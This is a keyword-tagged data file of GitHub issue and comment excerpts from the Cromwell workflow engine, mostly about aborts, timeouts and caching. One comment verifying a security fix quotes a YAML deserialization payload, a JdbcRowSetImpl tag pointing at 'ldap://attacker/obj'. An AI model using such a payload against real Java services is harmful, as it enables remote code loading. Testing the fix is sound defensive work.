Safety,StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65);,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1608,recover,recoverAsync,1608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,2,['recover'],['recoverAsync']
Safety,Statically detect bad ~{struct} interpolations,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3917:11,detect,detect,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3917,1,['detect'],['detect']
Safety,"Still experiencing this problem. It seems we cannot use `Array[File]` inside `struct`s for now. . ```Test.wdl; version development; ​; workflow Test {; input {; String file_name = ""file.txt""; String file_contents = ""teste""; }; ​; call WriteFile {; input:; file_name=file_name,; file_contents=file_contents; }; ​; Array[File] array_file = [WriteFile.output_file, WriteFile.output_file]; ​; MultiTypeStruct test_struct = {; ""file_name"" : file_name,; ""file"" : WriteFile.output_file,; ""array_file"" : array_file; }; ​; output {; MultiTypeStruct multi_type_struct_test = test_struct; }; }; ​; struct MultiTypeStruct {; String file_name; File file; Array[File] array_file; }; ​; task WriteFile {; input {; String file_name; String file_contents; }; ​; command <<<; echo -e """"""~{file_contents}"""""" > ~{file_name}; >>>; ​; runtime {; docker: ""gcr.io/google.com/cloudsdktool/cloud-sdk:330.0.0-alpine""; preemptible: 3; }; ​; output {; File output_file = ""~{file_name}""; }; }. ```. You can easily see an error happening when running a simple workflow like this. As long as you have an `Array[File]` inside a `struct`, it will keep on failing. In my case, I'm using `version development`, and the last task on the workflow simply gets stuck with status `Running` while the workflow itself moves to status `Aborting` and stays stuck permanently in `Aborting` (never actually moving its status to `Aborted`). Experienced this issue with Cromwell versions 63 and 74, while using GCP lifescience v2 backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-1017704304:1292,Abort,Aborting,1292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-1017704304,6,['Abort'],"['Aborted', 'Aborting']"
Safety,"Still need to performance-test on alpha. Problematic pairs:; * fetch <-> heartbeat (already coordinated); * fetch <-> abort (newly coordinated); * fetch <-> delete (newly coordinated). Example queries from MySQL deadlock printout in prod:. **Abort**; ```; update ; `WORKFLOW_STORE_ENTRY` ; set ; `WORKFLOW_STATE` = 'Aborting' ; where ; `WORKFLOW_STORE_ENTRY`.`WORKFLOW_EXECUTION_UUID` = '109a9d01-10b6-425d-8381-12a9d3a2c134'. ```; **Delete from workflow store**; ```; delete `WORKFLOW_STORE_ENTRY` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; `WORKFLOW_STORE_ENTRY`.`WORKFLOW_EXECUTION_UUID` = 'c4961523-321b-4172-abe8-e1e4eba94f43'. ```; **Fetch startable workflows**; ```; select ; `WORKFLOW_EXECUTION_UUID`, ; `WORKFLOW_DEFINITION`, ; `WORKFLOW_URL`, ; `WORKFLOW_ROOT`, ; `WORKFLOW_TYPE`, ; `WORKFLOW_TYPE_VERSION`, ; `WORKFLOW_INPUTS`, ; `WORKFLOW_OPTIONS`, ; `WORKFLOW_STATE`, ; `SUBMISSION_TIME`, ; `IMPORTS_ZIP`, ; `CUSTOM_LABELS`, ; `CROMWELL_ID`, ; `HEARTBEAT_TIMESTAMP`, ; `HOG_GROUP`, ; `WORKFLOW_STORE_ENTRY_ID` ; from ; `WORKFLOW_STORE_ENTRY` ; where ; (; (`HEARTBEAT_TIMESTAMP` is null) ; or (; `HEARTBEAT_TIMESTAMP` < '2020-09-18 05:08:18.823'; ); ) ; and (; not (`WORKFLOW_STATE` = 'On Hold'); ) ; order by ; `SUBMISSION_TIME` ; limit ; 30 for ; update; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906:118,abort,abort,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906,3,"['Abort', 'abort']","['Abort', 'Aborting', 'abort']"
Safety,"Stopped closing a scala `Future` over akka's `context.become`.; Flipped the default for `requestsAbortAndDiesImmediately` from `false` to `true`.; When killing a Standard backend job with rADI false, both the rc and the standard error are required.; Writing the stderr on abort for the SFS backend.; When rADI is true, sending a backend status of `""Aborted""`.; In the engine, set and store the `ExecutionStatus.Aborted`.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2032:272,abort,abort,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2032,3,"['Abort', 'abort']","['Aborted', 'abort']"
Safety,"Stumbled upon this while trying to abort a CWL workflow that was failing to submit to JES.; Aborting it was not short circuiting the ""try 10 times"" mechanism of creating JES runs or polling.; The workflow do end up in `Aborted` state after the 10 retries so we don't necessarily have to hotfix it.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3069:35,abort,abort,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3069,3,"['Abort', 'abort']","['Aborted', 'Aborting', 'abort']"
Safety,Submitted a new commit that works around a MariaDB issue. Requesting sanity check for that new commit.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5058#issuecomment-510463770:69,sanity check,sanity check,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5058#issuecomment-510463770,1,['sanity check'],['sanity check']
Safety,"Subset of https://github.com/broadinstitute/cromwell/pull/7359 concerned with upgrading the Google Cloud SDK only, in order to deploy separately & de-risk.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7361:150,risk,risk,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7361,1,['risk'],['risk']
Safety,Support for aborting On Hold workflows.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4368:12,abort,aborting,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4368,1,['abort'],['aborting']
Safety,"Sure. What's the ticket number? The issue this user posted is about both submitted workflows and aborted workflows getting stuck. I asked him/her to abort the submitted ones so that the workspace would stop showing as Running, but that didn't work. Can we confirm that they aren't getting charged for machines not aborting that they have requested to abort?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335536766:97,abort,aborted,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335536766,4,['abort'],"['abort', 'aborted', 'aborting']"
Safety,"Suspicious:. [Travis](https://travis-ci.com/github/broadinstitute/cromwell/jobs/403803242) times out at 180m with these messages:; ```; 2020-10-22 15:23:30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:221,Abort,Abort,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,5,['Abort'],['Abort']
Safety,Sync centaur timeouts with heartbeats in test.inc.sh,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3874:13,timeout,timeouts,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3874,1,['timeout'],['timeouts']
Safety,"TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out wai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:999,timeout,timeout,999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['timeout'],['timeout']
Safety,TEST Recovering Jobs: Turn Cromwell off/on,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2111:5,Recover,Recovering,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2111,1,['Recover'],['Recovering']
Safety,TOL - Shouldn't we run the finalization actor anyway if we're aborting during execution ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222828225:62,abort,aborting,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/893#issuecomment-222828225,1,['abort'],['aborting']
Safety,TOL2: Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934:115,avoid,avoid,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105146934,1,['avoid'],['avoid']
Safety,"Tagged all database specific tests as `IntegrationTest`.; As mysql now has 5s to timeout, increased the testing timeout used to detect if mysql is available.; Removed unused code and optimized imports.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/398:81,timeout,timeout,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/398,3,"['detect', 'timeout']","['detect', 'timeout']"
Safety,Test reliability: filesystem startup timeouts and docker health check errors [BA-6164],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5341:37,timeout,timeouts,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5341,1,['timeout'],['timeouts']
Safety,"Tests are incomplete / non-unit tests. May mock out a client, or figure out a way to detect a local pem/p12.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160741667:85,detect,detect,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/307#issuecomment-160741667,1,['detect'],['detect']
Safety,"Tests like `abort.scheduled_abort` should run also run sequentially, inline with the current Restart test cases. Otherwise, Travis+Centaur produces false negative results, requiring the test to be re-run, and delaying PR merges. There are currently two suites of tests: those that run in parallel, and those that run sequentially. The ""sequential"" tests are currently _only_ of the category ""start a workflow job, restart, then ensure that job still succeeds"". [Here ](https://travis-ci.org/broadinstitute/cromwell/jobs/312225757#L2955) is an example`abort.scheduled_abort` (wf 6d64cc05) running in parallel with a restart test case. The workflow job is supposed to abort. But because cromwell restarts during the middle of the job, TES is unable to tell if the job was running and marks it as [`Failed` instead of `Aborted`](https://travis-ci.org/broadinstitute/cromwell/jobs/312225757#L3534). The [`RestartTestCaseSpec`](https://github.com/broadinstitute/cromwell/blob/4a37f95cc49567505ad50907f85c4fa046ac596e/centaur/src/it/scala/centaur/RestartTestCaseSpec.scala) could be renamed to `Sync` or `Sequential` and also used for these additional tests. In theory this should only take a half-day to test and fix and would save frustration across multiple PRs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3010:12,abort,abort,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3010,4,"['Abort', 'abort']","['Aborted', 'abort']"
Safety,"Tex-- assuming liquibase has been successfully run in the past, this `run.sh`, combined with the latest jenkins config file, _should_ start up the server cleanly. If you could sanity check run for me, I'd appreciate it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052:176,sanity check,sanity check,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052,1,['sanity check'],['sanity check']
Safety,Thanks @carbocation - based on what you're saying it sounds like those run creation requests are in fact succeeding but just taking longer than Cromwell's request timeout to respond. For whoever picks up this ticket: I believe that wiring through an option to increase [timeouts on the requests to Google](https://developers.google.com/api-client-library/java/google-api-java-client/errors) (and make the value configurable) is hopefully sufficient for fixing this error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019:163,timeout,timeout,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019,2,['timeout'],"['timeout', 'timeouts']"
Safety,"Thanks @cjllanwarne , . > 2019-04-24 10:49:25,556 INFO - DispatchedConfigAsyncJobExecutionActor [UUID(917dfbca)JointGenotyping.ImportGenotypeGVCFs:7640:1]: Cromwell will watch for an rc file but will *not* double-check whether this job is actually alive (unless Cromwell restarts). So I guess I have not managed to enable polling after all! Edit: I found that I mispelt the configuration line, I wonder if there was a message telling me about misspelling in the logs. I had not heard of exit-poll-timeout, I assume you mean exit-code-timeout-seconds, or is this the `unrelated to this timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965:497,timeout,timeout,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965,3,['timeout'],"['timeout', 'timeout-seconds']"
Safety,Thanks @illusional! I dont think will be an option for us. Given the variable nature of the number of genomes we are going to be dealing with we are eventually going to hit this again even if we did reduce our reliance on the read functions. It feels like it needs an option in the config to increase the timeout.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311:305,timeout,timeout,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311,1,['timeout'],['timeout']
Safety,"Thanks @kshakir! . Mint team just noticed a similar issue for a few of our workflows, where the workflow status in Cromwell is ""running"" but the VM instance is no longer running. These specific workflows were ""stuck"" on the first task and did not start any subworkflows. When trying to abort the workflow, I get the following error: . ```; {; ""status"": ""error"",; ""message"": ""Couldn't abort 467b64cc-9aa4-4eaf-85ef-16ed4d540d4c because no workflow with that ID is in progress""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3654#issuecomment-402854046:286,abort,abort,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3654#issuecomment-402854046,2,['abort'],['abort']
Safety,"Thanks @mr-c, I modified the example a bit to be compatible with the classes present in our JVM and I do now see a difference between `Constructor` and `SafeConstructor` that suggests we could have been exposed before the change. (Deliberately ommited `autoCommit` because it seems to be unsupported in our JVM and causes a much less interesting error.); ```; cwlVersion: v1.0; class: Workflow; inputs: []; steps: []; outputs: []. hints:; - class: foo; bar: !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; ```. Old Cromwell, workflow succeeds with just some extra log messages:. ```; WARNING: An illegal reflective access operation has occurred; WARNING: Illegal reflective access by org.yaml.snakeyaml.constructor.BaseConstructor (file:/Users/anichols/Downloads/cromwell-69.jar) to constructor com.sun.rowset.JdbcRowSetImpl(); WARNING: Please consider reporting this to the maintainers of org.yaml.snakeyaml.constructor.BaseConstructor; WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations; WARNING: All illegal access operations will be denied in a future release; ```; ```; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: checking item; ../../../var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/cwl_temp_file_ef439db0-21c5-4035-87b2-0613819fc113.cwl:8:3: Field `class` contains undefined reference to `file:///var/folders/xj/rglhyd6s2lbbrz8r53vn_rww0000gp/T/cwl_temp_dir_8673604963791319219/foo`; ```. New Cromwell, workflow is rejected:. ```; Workflow input processing failed:; could not determine a constructor for the tag tag:yaml.org,2002:com.sun.rowset.JdbcRowSetImpl; in 'reader', line 9, column 8:; bar: !!com.sun.rowset.JdbcRowSetImpl; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194:153,Safe,SafeConstructor,153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932368194,1,['Safe'],['SafeConstructor']
Safety,"Thanks for pointing this out, @antonkulaga - this looks to me like a bug in our draft-2 and 1.0 support. I think this is probably something that could possibly be improved in a future WDL spec version. IMO ideally we wouldn't have to have a ""mixed"" return type function (since it plays badly with type-safety,) I think I'd prefer `read_json_object` and `read_json_array`, for example - but that would be up to the openWDL group, and this is definitely a bug in our interpretation for now!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4518#issuecomment-454047093:302,safe,safety,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4518#issuecomment-454047093,1,['safe'],['safety']
Safety,"Thanks for the clarification @dspeck1. I would just like to comment that the behavior here feels very unintuitive from a user perspective, and so pushing the handling of it onto users feels risky to me. Personally, I would be very surprised if many users would think to implement handling this themselves, even if there were an attempt to widely document it; it's just too different from the way (at least I) expect a workflow task to operate. Given the requirements for hitting this behavior, I don't _think_ there is a risk to workflow accuracy or reproducibility associated with it. But I haven't systematically explored the entire space of this edge case, so it certainly does worry me a bit that some sort of strange related behavior could somehow affect workflows which actually succeed. Which would be a much more significant issue, imo.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653:190,risk,risky,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653,2,['risk'],"['risk', 'risky']"
Safety,"Thanks for the feedback. Can you elaborate more on the need to be able to; run a container as privileged?. It could (in theory) be parameterized if required but it seems hazardous to; have this be the default. On Tue, Jan 5, 2021 at 5:42 PM Shane Canon <notifications@github.com> wrote:. > We have a similar need. This overlaps a little with #4579; > <https://github.com/broadinstitute/cromwell/issues/4579>. It would be; > useful if the submit-docker was parameterized similar to how it is for some; > of the other backends.; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-754946394>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ELZQ5HVOSV2JRMIH3LSYOIVRANCNFSM4RQDAKPQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082:170,hazard,hazardous,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-755294082,2,['hazard'],['hazardous']
Safety,Thanks for the link to the centaur docs! I'll work on adding a testcase for this. Looks like that CI failure is a timeout error? Not sure what to make of that... but I'll see what happens after adding the new testcase.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525773176:114,timeout,timeout,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525773176,1,['timeout'],['timeout']
Safety,"Thanks very much! In this case I had set one of my parameters to a very large number in order to avoid triggering file chunking (the Int represented maximum number of lines to read from a file before chunking). . I don't want this to take away from the fact that on genome-scale computing, there are lots of reasons for people to want to use a double. One example would be to indicate the length of the genome in bases (~3b for humans, more for some other organisms).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2685#issuecomment-335946538:97,avoid,avoid,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2685#issuecomment-335946538,1,['avoid'],['avoid']
Safety,"Thanks, @geoffjentry. The quota failures were on the JES side, I think, and were reported back to Cromwell; I'm not sure how you would be able to detect a failure of one type versus another. Probably good to follow the conversation [here](https://groups.google.com/forum/#!topic/google-genomics-discuss/OL18jPoPvPE), as it sounds like Google is still sorting out a few things.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645132:146,detect,detect,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645132,1,['detect'],['detect']
Safety,"Thanks. I think I have a clue, your lowest level exception says; ```; 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media; ```; which does not match the pattern; ```; "".*Could not read from gs.+504 Gateway Timeout.*""; ```; introduced in https://github.com/broadinstitute/cromwell/pull/5344",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699:82,Timeout,Timeout,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699,2,['Timeout'],['Timeout']
Safety,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:75,avoid,avoid,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242,1,['avoid'],['avoid']
Safety,"The 'should' string is:; ```; should abort a workflow mid run and restart immediately abort.restart_abort_tes *** FAILED ***; ```. The error message is:; ```; Metadata mismatch for calls.scheduled_abort.aborted.executionStatus - expected: ""Failed"" but got: ""Aborted""; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3392:37,abort,abort,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3392,4,"['Abort', 'abort']","['Aborted', 'abort', 'aborted']"
Safety,"The CopyWorkflowActor regularly gets timeouts when trying to copy the gigabytes of data that are typically associated with production workflows. Also this duplicates the amount of disk space used for a workflow. . This remedies that problem by hardlinking the files. It is much much faster, and the cromwell-executions folder can be safely removed afterward. This is very beneficial for people who run cromwell on a cluster backend in `run` mode. Ping @illusional . I have included a test case.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6672:37,timeout,timeouts,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6672,2,"['safe', 'timeout']","['safely', 'timeouts']"
Safety,"The DNS name `batch.default.amazonaws.com` does not resolve - perhaps you need to change a value of `default` in the config to something else. For example, `batch.us-east-1.amazonaws.com` resolves fine (though predictably doesn't respond to ping, load a web page, etc.).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568:210,predict,predictably,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4334#issuecomment-434316568,1,['predict'],['predictably']
Safety,The EJEA is sending RecoverJobCommand or ExecuteJobCommand depending on if the workflow is restarting or not. So I think this is already done.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/664#issuecomment-233432623:20,Recover,RecoverJobCommand,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/664#issuecomment-233432623,1,['Recover'],['RecoverJobCommand']
